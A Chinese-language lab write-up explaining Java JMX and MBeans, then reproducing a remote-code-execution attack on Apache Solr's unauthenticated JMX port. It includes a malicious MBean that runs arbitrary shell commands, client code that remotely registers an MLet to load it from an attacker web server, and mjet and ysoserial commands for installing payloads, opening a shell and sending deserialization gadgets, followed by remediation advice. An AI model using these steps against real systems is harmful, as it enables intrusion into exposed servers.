# JMX和MBean

**JMX**是Java Management Extensions，它是一个Java平台的管理和监控接口。但不是所有的java类都能被管理。只有按照特定格式编写的java类才能被jmx原理。这些被管理的类我们称为Mbean。

这些MBean全部由MBeanServer管理，如果要访问MBean，可以通过MBeanServer对外提供的访问接口，例如通过RMI或HTTP访问

## 一个简单的MBean

先定义一个接口，定义格式xxxMBean

```
package MBean;

public interface HelloMBean {
    public void Hello();
    public String aaa(String a);
}

```

实现类

```
package MBean;

import javax.management.MBeanServer;
import javax.management.ObjectName;
import javax.management.remote.JMXConnectorServer;
import javax.management.remote.JMXConnectorServerFactory;
import javax.management.remote.JMXServiceURL;
import java.lang.management.ManagementFactory;
import java.net.MalformedURLException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class Hello implements HelloMBean {
    public void Hello() {
        System.out.println("Hello DawnT0wn");
    }

    public String aaa(String a) {
        System.out.println(a + "success");
        return a+" ok";

    }

    public static void main(String[] args) throws Exception {
        MBeanServer mBeanServer = ManagementFactory.getPlatformMBeanServer();
        ObjectName helloName = new ObjectName("HelloMBean:name=Hello");
        mBeanServer.registerMBean(new Hello(), helloName);//向MBeanServer 注册 mbean
        Registry registry = LocateRegistry.createRegistry(2333);//绑定端口
        JMXServiceURL jmxServiceURL = new JMXServiceURL("service:jmx:rmi:///jndi/rmi://localhost:2333/jmxrmi");//构造 JMXServiceURL
        JMXConnectorServer jmxConnectorServer = JMXConnectorServerFactory.newJMXConnectorServer(jmxServiceURL, null, mBeanServer);
        jmxConnectorServer.start();
        System.out.println("JMXConnectorServer is running");
    }
}

```

对于已经实现的MBean，我们就需要去监控和管理了，我们用到的是MBeanServer

上面代码的运行过程就是向MBeanServer去注册MBean

在MBeanServer注册后，就需要用东西去管理他，直接命令行输入jconsole

![image-20221121110159292](images/1.png)

![image-20221121110104365](images/2.png)

连接后点击对应的方法

![image-20221121110115516](images/3.png)

服务端已经被调用了

整体的代码实现如下

```
package MBean;

import javax.management.MBeanServerConnection;
import javax.management.ObjectName;
import javax.management.remote.JMXConnector;
import javax.management.remote.JMXConnectorFactory;
import javax.management.remote.JMXServiceURL;

public class test {
    public static void main(String[] args) throws Exception {
        JMXServiceURL url = new JMXServiceURL("service:jmx:rmi:///jndi/rmi://localhost:2333/jmxrmi");
        JMXConnector jmxConnector = JMXConnectorFactory.connect(url, null);
        MBeanServerConnection mBeanServerConnection = jmxConnector.getMBeanServerConnection();
        ObjectName mbeanName = new ObjectName("HelloMBean:name=Hello");
        mBeanServerConnection.invoke(mbeanName, "aaa", null, null);//通过反射机制执行Hello中的hello()方法
    }

}
```

# 远程加载MBean

## MLet

在系统中，自带了一个特殊的MBean，交MLet

定义如下

```
/**  * Exposes the remote management interface of the MLet  * MBean.  */ public interface MLetMBean   {
```

```
public class MLet extends java.net.URLClassLoader
implements MLetMBean, MBeanRegistration, Externalizable { private static final long serialVersionUID = 3636148327800330130L;/** * The reference to the MBean server.*/ private MBeanServer server = null;
```

可以看到这是一个与远程管理MBean相关的MBean

https://www.apiref.com/java11-zh/java.management/javax/management/loading/MLet.html

官方的解释如下

![image-20221121110519726](images/4.png)

我们可以通过MLet来加载我们vps远程的一个MBean，具体实现是在getMBeansFromURL函数

```
     public Set<Object> getMBeansFromURL(URL url)
             throws ServiceNotFoundException  {
         if (url == null) {
             throw new ServiceNotFoundException("The specified URL is null");
         }
         return getMBeansFromURL(url.toString());
     }
```

但是getMBeansFromURL去哪里加载MBean，加载哪一个MBean需要我们用一个MLet文件定义

下面我们简单看下几个必须字段的含义。

CODE = class

此属性指定了要获取的 MBean 的Java 类的全名，包括包名称。

ARCHIVE = " archiveList "

此属性是必需的，它指定了一个或多个 .jar 文件，这些文件包含要获取的MBean 使用的 MBean 或其他资源。

NAME = mbeanname

当 m-let 已注册MBean 实例时，此可选属性指定了要分配给MBean 实例的对象名称。如果mbeanname 以冒号字符(:) 开始，则对象名称的域部分是 MBean 服务器的默认域，可由 MBeanServer.getDefaultDomain()返回

## 恶意MBean加载

mlet文件

```
<MLET CODE=Payload ARCHIVE=Payload.jar NAME=:NAME=Payload></MLET>
```

payload

```
package MBean;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

public class Payload implements PayloadMBean {
    public String runCmd(String cmd) throws IOException, InterruptedException {
        Runtime runtime = Runtime.getRuntime();
        Process process = runtime.exec(cmd);
        BufferedReader stdInput = new BufferedReader(new InputStreamReader(process.getInputStream()));
        BufferedReader stdError = new BufferedReader(new InputStreamReader(process.getErrorStream()));
        String stdout_data = "";
        String strtmp;
        while ((strtmp = stdInput.readLine()) != null) {
            stdout_data += strtmp + "\n";
        }
        while ((strtmp = stdError.readLine()) != null) {
            stdout_data += strtmp + "\n";
        }
        process.waitFor();
        return stdout_data;
    }
}
```

将Payload.java和PayloadMBean.java编译成jar包和mlet文件放在一个web目录下

用python起一个简易的http服务

```
python3 -m http.server 8088
```

注册MBeanServer

```
package MBean;
import javax.management.MBeanServer;
import javax.management.ObjectName;
import javax.management.loading.MLet;
import javax.management.remote.JMXConnectorServer;
import javax.management.remote.JMXConnectorServerFactory;
import javax.management.remote.JMXServiceURL;
import java.lang.management.ManagementFactory;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class MLetRemote {
    public static void main(String[] args) throws Exception {
        MBeanServer mBeanServer = ManagementFactory.getPlatformMBeanServer();
        MLet mLet = new MLet();
        ObjectName objectName = new ObjectName("JMXMLet:type=MLet");
        mBeanServer.registerMBean(mLet, objectName);
        mLet.getMBeansFromURL("http://localhost:8088/mlet");
        Registry registry = LocateRegistry.createRegistry(4444);
        JMXServiceURL jmxServiceURL = new JMXServiceURL("service:jmx:rmi:///jndi/rmi://localhost:4444/jmxrmi");
        JMXConnectorServer jmxConnectorServer = JMXConnectorServerFactory.newJMXConnectorServer(jmxServiceURL, null, mBeanServer);
        jmxConnectorServer.start();
        System.out.println("JMXConnectorServer is running");
    }
}
```

连接后

![image-20221121121615236](images/5.png)

# 客户端远程注册

之前虽然是命令执行了，但是却是在服务端去写的这种加载远程MBean的代码，那服务端是我们不能控制的，所以说，能不能通过客户端去实现一个远程加载MBean呢？答案是可以的

首先写一个最基本的服务端，没有注册任何一个新的MBean

```
package MBean;

import javax.management.MBeanServer;
import javax.management.MBeanServerConnection;
import javax.management.ObjectName;
import javax.management.remote.*;
import java.lang.management.ManagementFactory;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class test {
    public static void main(String[] args) throws Exception {
        MBeanServer mBeanServer = ManagementFactory.getPlatformMBeanServer();
        Registry registry = LocateRegistry.createRegistry(2333);//绑定端口
        JMXServiceURL jmxServiceURL = new JMXServiceURL("service:jmx:rmi:///jndi/rmi://localhost:2333/jmxrmi");//构造 JMXServiceURL
        JMXConnectorServer jmxConnectorServer = JMXConnectorServerFactory.newJMXConnectorServer(jmxServiceURL, null, mBeanServer);
        jmxConnectorServer.start();
        System.out.println("JMXConnectorServer is running");
    }

}
```

本地我们可以通过MBeanServer.RegisterMBean注册MBean

远端我们可以通过MBeanServerConnection.createMBean注册MBean

客户端代码

```
package MBean;

import com.sun.jmx.interceptor.DefaultMBeanServerInterceptor;

import javax.management.MBeanServerConnection;
import javax.management.remote.JMXConnector;
import javax.management.remote.JMXConnectorFactory;
import javax.management.remote.JMXServiceURL;

public class client {
    public static void main(String[] args) throws Exception{
        JMXServiceURL jmxServiceURL = new JMXServiceURL("service:jmx:rmi:///jndi/rmi://localhost:2333/jmxrmi");
        JMXConnector jmxConnector = JMXConnectorFactory.connect(jmxServiceURL,null);
        MBeanServerConnection mBeanServerConnection = jmxConnector.getMBeanServerConnection();
        mBeanServerConnection.createMBean("javax.management.loading.MLet",null);
    }
}
```

这样我们可以去注册一个MLet这样一个MBean，我们之前说过，MLet中存在一个getMBeansFromURL可以来远程加载MBean

jconsole连接的效果

![image-20221121123618697](images/6.png)

运行客户端后

![image-20221121123706360](images/7.png)

然后去执行getMBeanFromURL

![image-20221121123804647](images/8.png)

可以看到，恶意的Payload这个MBean已经注册

![image-20221121123836210](images/9.png)



# Apache Solr RCE复现

漏洞编号：CVE-2019-0192

影响版本：Apache Solr8.1.1和8.2.0版本

漏洞概述：Apache Solr的8.1.1和8.2.0版本的自带配置文件solr.in.sh中存在不安全的选项ENABLE_REMOTE_JMX_OPTS="true"。如果受害者使用了该默认配置，则会在默认端口18983开放JMX服务，且默认未开启认证。任何可访问此端口的攻击者可利用此漏洞向受影响服务发起攻击，执行任意代码。

Solr是一个独立的企业级搜索应用服务器，它对外提供类似于Web-service的API接口。用户可以通过http请求，向搜索引擎服务器提交一定格式的XML文件，生成索引；也可以通过Http Get操作提出查找请求，并得到XML格式的返回结果

复现环境：Solr 8.20、Java环境、MAC OS系统

注：该漏洞仅对Linux系统的Solr有影响，在Windows系统中不受影响。

https://mirrors.tuna.tsinghua.edu.cn/apache/lucene/solr/8.2.0/solr-8.2.0.zip

切换到bin目录启动Solr

```javascript
./solr  start  -force
```

![image-20221121153135094](images/10.png)

![image-20221121153143677](images/11.png)

## 第一种方式

因为JMX并没有开启服务认证，所以我们可以直接去连接18983端口的MBean

![image-20221122102426063](images/12.png)

和之前一样，从客户端远程注册一个MLet

```
package MBean;


import javax.management.MBeanServerConnection;
import javax.management.remote.JMXConnector;
import javax.management.remote.JMXConnectorFactory;
import javax.management.remote.JMXServiceURL;

public class client {
    public static void main(String[] args) throws Exception{
        JMXServiceURL jmxServiceURL = new JMXServiceURL("service:jmx:rmi:///jndi/rmi://localhost:18983/jmxrmi");
        JMXConnector jmxConnector = JMXConnectorFactory.connect(jmxServiceURL,null);
        MBeanServerConnection mBeanServerConnection = jmxConnector.getMBeanServerConnection();
        mBeanServerConnection.createMBean("javax.management.loading.MLet",null);
    }
}
```

然后远程加载服务器上的恶意MBean

![image-20221122102547282](images/13.png)

![image-20221122102607859](images/14.png)

## 第二种方式

利用工具https://github.com/mogwailabs/mjet

```
jython mjet.py 127.0.0.1 18983 install super_secret http://127.0.0.1:8000 8000
```

![image-20221122123834031](images/15.png)

获取一个shell

```
jython mjet.py 127.0.0.1 18983 shell super_secret
```

![image-20221122123900198](images/16.png)

```
jython mjet.py 127.0.0.1 18983 command super_secret "ls"
```

![image-20221122124115672](images/17.png)

从目标中卸载MBean，这样我们注册的恶意MBean就会被删除

```
jython mjet.py 127.0.0.1 18983 uninstall
```

网上还有一些用MSF复现的，但是那个我没有打通就没有去搞了

### 第三种方式

在开启认证后，前面两种方法是打不了的，因为开启认证是不能调用`jmx.remote.x.mlet.allow.getMBeansFromURL`，这样就没有办法去远程注册恶意的MBean了

通过反序列化去攻击，当然这种方式需要服务端有相应的gadget，而且要吧ysoserial.jar导入mjet项目里面去

```
jython mjet.py 127.0.0.1 18983 deserialize CommonsCollections6 "open /System/Applications/Calculator.app"
```

也可以直接用ysoserial

```
java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JMXInvokeMBean 127.0.0.1 18983 CommonsCollections6 "open /System/Applications/Calculator.app"
```

这里我没有去添加相应的jar包了



修复方案

将solr.in.sh配置文件中的ENABLE_REMOTE_JMX_OPTS选项设置为false，然后重启Solr服务。

防止手段 ：

1. 不要通过`com.sun.management.jmxremote.port`。这将启动仅本地的JMX服务器，您可以从`com.sun.management.jmxremote.localConnectorAddress`获得连接地址 http://docs.oracle.com/javase/6/docs/technotes/guides/management/agent .html
2. 启用SSL客户端证书身份验证
3. 启用密码验证并使用SSL
4. 防火墙墙端口



参考链接

https://cloud.tencent.com/developer/article/1613527

https://www.cnblogs.com/muphy/p/13971984.html

https://www.cnblogs.com/0x28/p/15685164.html

https://hu3sky.github.io/2020/03/06/JMX-RMI/

https://www.anquanke.com/post/id/200682#h3-6